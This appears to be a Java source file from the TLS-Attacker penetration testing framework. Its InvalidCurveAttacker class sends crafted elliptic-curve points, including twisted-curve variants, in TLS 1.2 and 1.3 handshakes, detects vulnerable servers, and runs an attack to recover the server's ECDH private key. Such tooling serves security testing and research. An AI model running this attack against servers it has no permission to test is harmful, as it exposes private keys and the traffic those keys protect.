/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackConfig;
import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
import de.rub.nds.tlsattacker.attacks.task.InvalidCurveTask;
import de.rub.nds.tlsattacker.attacks.util.response.FingerprintSecretPair;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseExtractor;
import de.rub.nds.tlsattacker.attacks.util.response.ResponseFingerprint;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.AlgorithmResolver;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurve;
import de.rub.nds.tlsattacker.core.crypto.ec.EllipticCurveOverFp;
import de.rub.nds.tlsattacker.core.crypto.ec.FieldElementFp;
import de.rub.nds.tlsattacker.core.crypto.ec.Point;
import de.rub.nds.tlsattacker.core.crypto.ec.PointFormatter;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateMessage;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateVerifyMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.HandshakeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.NewSessionTicketMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.extension.ExtensionMessage;
import de.rub.nds.tlsattacker.core.protocol.message.extension.KeyShareExtensionMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.ParallelExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ChangeDefaultPreMasterSecretAction;
import de.rub.nds.tlsattacker.core.workflow.action.GenericReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.MessageAction;
import de.rub.nds.tlsattacker.core.workflow.action.MessageActionFactory;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction.ReceiveOption;
import de.rub.nds.tlsattacker.core.workflow.action.ResetConnectionAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.action.TlsAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsattacker.core.workflow.task.StateExecutionTask;
import de.rub.nds.tlsattacker.core.workflow.task.TlsTask;
import de.rub.nds.tlsattacker.transport.ConnectionEndType;
import java.math.BigInteger;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.BigIntegers;

/**
 *
 */
public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private BigInteger premasterSecret;

    private List<FingerprintSecretPair> responsePairs;

    private List<Point> receivedEcPublicKeys;
    
    /**
     * All keys we received from a server in handshakes that lead
     * to a ServerFinished - we can use these to mitigate the impact
     * of false positives in scans.
     */
    private List<Point> finishedKeys;
    
    private final ParallelExecutor executor;
    
    /**
     * Indicates if there is a higher chance that the keys we extracted might
     * have been sent by a TLS accelerator and a TLS server behind it
     * at the same time. (See evaluateExecutedTask)
     */
    private boolean dirtyKeysWarning;

    /**
     *
     * @param config
     * @param baseConfig
     */
    public InvalidCurveAttacker(InvalidCurveAttackConfig config, Config baseConfig) {
        super(config, baseConfig);
        executor = new ParallelExecutor(1, 3);
    }

    @Override
    public void executeAttack() {
        Config tlsConfig = getTlsConfig();
        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultSelectedNamedGroup()
                .name());
        EllipticCurve curve = CurveFactory.getCurve(tlsConfig.getDefaultSelectedNamedGroup());
        RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
                tlsConfig.getDefaultSelectedNamedGroup());
        BigInteger result = attacker.attack();
        LOGGER.info("Result found: {}", result);
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        if (!AlgorithmResolver.getKeyExchangeAlgorithm(getTlsConfig().getDefaultSelectedCipherSuite()).isEC()) {
            LOGGER.info("The CipherSuite that should be tested is not an Ec one:"
                    + getTlsConfig().getDefaultSelectedCipherSuite().name());
            return null;
        }
        responsePairs = new LinkedList<>();
        receivedEcPublicKeys = new LinkedList<>();
        finishedKeys = new LinkedList<>(); 
        dirtyKeysWarning = false;

        EllipticCurve curve;
        Point point;
        if (config.isCurveTwistAttack()) {
            curve = buildTwistedCurve();
            BigInteger transformedX = config.getPublicPointBaseX().multiply(config.getCurveTwistD())
                    .mod(curve.getModulus());
            point = Point.createPoint(transformedX, config.getPublicPointBaseY(), config.getNamedGroup());
        } else {
            curve = CurveFactory.getCurve(config.getNamedGroup());
            point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(),
                    config.getNamedGroup());
        }

        int protocolFlows = getConfig().getProtocolFlows();
        if (config.getPremasterSecret() != null) {
            protocolFlows = 1;
        }
        
        List<TlsTask> taskList = new LinkedList<>();
        for (int i = 1; i <= protocolFlows; i++) {
            setPremasterSecret(curve, i, point);
            InvalidCurveTask taskToAdd = new InvalidCurveTask(buildState(), executor.getReexecutions(), i);
            if(config.isAttackInRenegotiation() && getTlsConfig().getHighestProtocolVersion() == ProtocolVersion.TLS13) {
                taskToAdd.setResolveTls13CCSdiscrepancy(true);
            }
            taskList.add(taskToAdd);    
        }
        executor.bulkExecuteTasks(taskList);
        return evaluateExecutedTasks(taskList);
    }

    private void setPremasterSecret(EllipticCurve curve, int i, Point point) {
        if (config.getPremasterSecret() != null) {
            premasterSecret = config.getPremasterSecret();
        } else {
            Point sharedPoint = curve.mult(new BigInteger("" + i), point);
            if (sharedPoint.getX() == null) {
                premasterSecret = BigInteger.ZERO;
            } else {
                premasterSecret = sharedPoint.getX().getData();
                if (config.isCurveTwistAttack()) {
                    // transform back from simulated x-only ladder
                    premasterSecret = premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus()))
                            .mod(curve.getModulus());
                }
            }
            LOGGER.debug("PMS for scheduled Workflow Trace with secret " + i + ": " + premasterSecret.toString());
        }
    }

    private State buildState() {
        Config tlsConfig = getTlsConfig();

        EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
        ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
        Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()),
                new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
        byte[] serialized = PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint,
                config.getPointCompressionFormat());
        serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitPMS = BigIntegers.asUnsignedByteArray(
                ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));

        WorkflowTrace trace;
        
        //we're modifying the config at runtime so all parallel workflow traces
        //need unique configs
        Config individualConfig = tlsConfig.createCopy();
        
        if (config.isAttackInRenegotiation()) {
            trace = prepareRenegotiationTrace(serializedPublicKey, pms, explicitPMS, individualConfig);
        } else {
            trace = prepareRegularTrace(serializedPublicKey, pms, explicitPMS, individualConfig);
        }

        State state = new State(individualConfig, trace);
        return state;
    }

    private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
            byte[] explicitPMS, Config individualConfig) {
        if (individualConfig.getHighestProtocolVersion() != ProtocolVersion.TLS13) {
            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCiphersuites().get(0));
        }
        WorkflowTrace trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                RunningModeType.CLIENT);
        if (individualConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13) {

            // replace specific receive action with generic
            trace.removeTlsAction(trace.getTlsActions().size() - 1);
            trace.addTlsAction(new GenericReceiveAction());

            ClientHelloMessage cHello = (ClientHelloMessage) WorkflowTraceUtil.getFirstSendMessage(
                    HandshakeMessageType.CLIENT_HELLO, trace);
            KeyShareExtensionMessage ksExt;
            for (ExtensionMessage ext : cHello.getExtensions()) {
                if (ext instanceof KeyShareExtensionMessage) {
                    ksExt = (KeyShareExtensionMessage) ext;
                    ksExt.getKeyShareList().get(0).setPublicKey(serializedPublicKey); // we
                                                                                      // use
                                                                                      // exactly
                                                                                      // one
                                                                                      // key
                                                                                      // share
                }
            }

            // TODO: use action / modification to influence key derivation for
            // TLS 1.3
            individualConfig.setDefaultPreMasterSecret(explicitPMS);
        } else {
            trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(individualConfig), new ChangeCipherSpecMessage(
                    individualConfig), new FinishedMessage(individualConfig)));
            trace.addTlsAction(new GenericReceiveAction());

            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil
                    .getFirstSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
            message.setPublicKey(serializedPublicKey);
            message.prepareComputations();
            message.getComputations().setPremasterSecret(pms);
        }

        return trace;
    }

    private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
            byte[] explicitPMS, Config individualConfig) {
        WorkflowTrace trace;
        if (individualConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13) {
            trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
                    RunningModeType.CLIENT);
            trace.addTlsAction(new ReceiveAction(ReceiveOption.CHECK_ONLY_EXPECTED ,new NewSessionTicketMessage(false)));
            trace.addTlsAction(new ResetConnectionAction());

            // next ClientHello needs a PSKExtension
            individualConfig.setAddPreSharedKeyExtension(Boolean.TRUE);

            WorkflowTrace secondHandshake = prepareRegularTrace(serializedPublicKey, pms, explicitPMS, individualConfig);

            // subsequent ClientHellos don't need a PSKExtension
            individualConfig.setAddPreSharedKeyExtension(Boolean.FALSE);

            // make sure no explicit PreMasterSecret is set at this point
            individualConfig.setDefaultPreMasterSecret(new byte[0]);

            // set explicit PreMasterSecret later on using an action
            ChangeDefaultPreMasterSecretAction cPMS = new ChangeDefaultPreMasterSecretAction();
            cPMS.setNewValue(explicitPMS);
            trace.addTlsAction(cPMS);

            for (TlsAction action : secondHandshake.getTlsActions()) {
                trace.addTlsAction(action);
            }
        } else {
            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCiphersuites().get(0));
            trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(
                    WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION, RunningModeType.CLIENT);
            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getLastSendMessage(
                    HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
            message.setPublicKey(serializedPublicKey);
            message.prepareComputations();
            message.getComputations().setPremasterSecret(pms);
            
            // replace specific receive action with generic
            trace.removeTlsAction(trace.getTlsActions().size() - 1);
            trace.addTlsAction(new GenericReceiveAction());
        }

        return trace;
    }

    /**
     * @return the receivedEcPublicKeys
     */
    public List<Point> getReceivedEcPublicKeys() {
        return receivedEcPublicKeys;
    }

    private EllipticCurveOverFp buildTwistedCurve() {
        EllipticCurveOverFp intendedCurve = (EllipticCurveOverFp) CurveFactory.getCurve(config.getNamedGroup());
        BigInteger modA = intendedCurve.getA().getData().multiply(config.getCurveTwistD().pow(2))
                .mod(intendedCurve.getModulus());
        BigInteger modB = intendedCurve.getB().getData().multiply(config.getCurveTwistD().pow(3))
                .mod(intendedCurve.getModulus());
        EllipticCurveOverFp twistedCurve = new EllipticCurveOverFp(modA, modB, intendedCurve.getModulus());

        config.setTwistedCurve(twistedCurve);
        return twistedCurve;
    }
    
    private Boolean evaluateExecutedTasks(List<TlsTask> taskList)
    {
        boolean foundExecutedAsPlanned = false;
        boolean foundServerFinished = false;
        
        boolean tookKeyFromSuccessfullTrace = false;
        boolean tookKeyFromUnsuccessfullTrace = false;
        for(TlsTask tlsTask : taskList)
        {
            InvalidCurveTask task = (InvalidCurveTask) tlsTask;
            WorkflowTrace trace = task.getState().getWorkflowTrace();
            if(!task.isHasError())
            {
                foundExecutedAsPlanned = true;
                if (!(WorkflowTraceUtil.getLastReceivedMessage(trace) != null
                        && WorkflowTraceUtil.getLastReceivedMessage(trace).isHandshakeMessage() && ((HandshakeMessage) WorkflowTraceUtil
                            .getLastReceivedMessage(trace)).getHandshakeMessageType() == HandshakeMessageType.FINISHED)) {
                    LOGGER.info("Received no finished Message using secret" + task.getAppliedSecret());
                } else {
                    LOGGER.info("Received a finished Message using secret: " + task.getAppliedSecret() + "! Server is vulnerable!");
                    finishedKeys.add(task.getReceivedEcKey());
                    foundServerFinished = true;
                }
                
                if(task.getReceivedEcKey() != null)
                {
                    tookKeyFromSuccessfullTrace = true;
                    getReceivedEcPublicKeys().add(task.getReceivedEcKey());
                }
            }
            else {
                if(task.getReceivedEcKey() != null)
                {
                    tookKeyFromUnsuccessfullTrace = true;
                    getReceivedEcPublicKeys().add(task.getReceivedEcKey());
                }
            }
            responsePairs.add(new FingerprintSecretPair(task.getFingerprint(), task.getAppliedSecret()));
        }
        
        if(config.isAttackInRenegotiation() && tookKeyFromSuccessfullTrace && tookKeyFromUnsuccessfullTrace)
        {
            /*keys from an unsuccessfull trace might have been extracted
            from the first handshake of a renegotiation workflow trace - it
            *could* be more probable that this is not the same TLS server as
            the server, which answered the 2nd handshake
            while we can't ensure that were talking to the same TLS server all
            the time anyway, it is more important to keep an eye on this case
            since we're running attacks in renegotiation because we assume that
            we can bypass a TLS accelerator like this*/
            dirtyKeysWarning = true;
        }
        
        if(foundExecutedAsPlanned){
            if(foundServerFinished){
                return true;
            }
            else {
                return false;
            }
        }
        else
        {
            return null;
        }     
    }

    /**
     * @return the responsePairs
     */
    public List<FingerprintSecretPair> getResponsePairs() {
        return responsePairs;
    }

    /**
     * @param responsePairs the responsePairs to set
     */
    public void setResponsePairs(List<FingerprintSecretPair> responsePairs) {
        this.responsePairs = responsePairs;
    }

    /**
     * @return the dirtyKeysWarning
     */
    public boolean isDirtyKeysWarning() {
        return dirtyKeysWarning;
    }

    /**
     * @return the finishedKeys
     */
    public List<Point> getFinishedKeys() {
        return finishedKeys;
    }
}
